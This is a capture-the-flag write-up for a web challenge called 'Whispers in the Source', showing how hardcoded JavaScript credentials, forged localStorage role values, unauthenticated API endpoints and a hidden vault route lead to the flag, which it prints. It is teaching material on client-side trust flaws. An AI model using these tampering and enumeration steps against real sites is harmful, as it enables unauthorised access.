# 🏴‍☠️ Whispers in the Source — CTF Writeup

## Challenge Information
- **Challenge Name:** Whispers in the Source  
- **Category:** Web Exploitation  
- **Difficulty:** Medium  
- **Points:** 350  
- **Flag:** `SAVVY{br0w53r_15_n0t_l0y4l}`  

---

## Challenge Description

> The Black Pearl has docked at Whitecap Bay. The login panel appears functional, guarded by modern UI and warnings. Yet sailors whisper that the gate does not obey the server—it obeys the browser. Your task is not to break the gate... but to understand who truly controls it.

---

## 🎯 Challenge Overview

This challenge demonstrates why **client-side security is not real security**.

Vulnerabilities chained:

1. Client-Side Authentication  
2. Hardcoded Credentials in JavaScript  
3. localStorage Session Control  
4. Client-Side Role Enforcement  
5. Unprotected API Endpoints  
6. Fragment Reconstruction Logic  
7. Hidden Endpoint Discovery  

---

## 🔍 Reconnaissance

### Initial Landing Page

URL:
```
http://blackpearl.whitecapbay.ctf/
```

Title:
```
The Black Pearl - Whitecap Bay Terminal
```

Visual Clues:
- Moonlit ship background
- Login form
- Warning: *"The gate does not obey the server — it obeys the browser"*

### Credential Testing

| Username | Password | Result |
|--------|----------|--------|
| admin | admin | ❌ |
| admin | password | ❌ |
| test | test | ❌ |

No SQL injection detected.

---

## 📜 Phase 1: Client-Side Authentication Discovery

### Console Messages

```
[Black Pearl] Whitecap Bay Terminal v2.1
[Whisper] Check auth.js for the truth
[Whisper] localStorage holds more than it should
```

### Source Code Review

File:
```
/static/auth.js
```

Discovered:

```javascript
const VALID_CREDENTIALS = {
    'jack_sparrow': 'rumrunner',
    'will_turner': 'elizabeth',
    'joshamee': 'cotton_parrot',
    'deckhand_tom': 'anchor123'
};

const USER_ROLES = {
    'jack_sparrow': 'captain',
    'will_turner': 'officer',
    'joshamee': 'quartermaster',
    'deckhand_tom': 'sailor'
};
```

### Exploitation

Login:

```
jack_sparrow : rumrunner
```

Redirected to `/dashboard`.

### Result

- ✅ Hardcoded credentials found
- ✅ Client-only authentication confirmed

---

## 🗺️ Phase 2: localStorage Session Control

### Stored Values

```javascript
authenticated: "true"
username: "jack_sparrow"
role: "captain"
sessionToken: "..."
```

### Manipulation

```javascript
localStorage.setItem('username', 'hacker');
localStorage.setItem('role', 'admin');
location.reload();
```

### Result

- Dashboard accepts manipulated values
- Role-based access fully client-controlled

---

## ⚓ Phase 3: Admin Panel Bypass

### Exploitation

```javascript
localStorage.setItem('authenticated', 'true');
localStorage.setItem('username', 'pwned');
localStorage.setItem('role', 'captain');
window.location.href = '/admin';
```

### Outcome

Admin page loads successfully.

Message confirms:
> The gate does not obey the server — it obeys the browser.

### Result

- ✅ Admin bypass achieved
- ✅ No backend role verification

---

## 📖 Phase 4: API Enumeration

### Endpoint Testing

```
GET /api/notes/1
GET /api/notes/2
GET /api/notes/3
GET /api/notes/4
```

### Key Findings

- API has no authentication
- Private notes are accessible

### Fragment Collection

| User | Fragment |
|------|---------|
| Will Turner | PEARL |
| Joshamee | COMPASS |
| Tom | CODE |

Hidden note revealed:

```
/vault/final
```

---

## 🔐 Phase 5: Fragment Reconstruction

Fragments:

```
PEARL + COMPASS + CODE
```

Master Phrase:

```
PEARLCOMPASSCODE
```

---

## 🔱 Phase 6: Final Vault

### Direct Access

```
GET /vault/final?code=PEARLCOMPASSCODE
```

### Response

```
SAVVY{br0w53r_15_n0t_l0y4l}
```

---

## 🏁 Final Results

| Phase | Status |
|------|--------|
| Client Auth Discovery | ✅ |
| JS Credential Leak | ✅ |
| localStorage Control | ✅ |
| Admin Bypass | ✅ |
| API Exploitation | ✅ |
| Fragment Logic | ✅ |
| Vault Access | ✅ |

---

## 🧠 Lesson Learned

> **Never trust the client. Ever.**

All security decisions were made in JavaScript, allowing total control by the attacker.

---

## 📌 Flag

```
SAVVY{br0w53r_15_n0t_l0y4l}
```

---

**CTF:** Whispers in the Source  
**Challenge:** Whispers in the Source  
**Writeup by:** DarkPulseX 🏴‍☠️
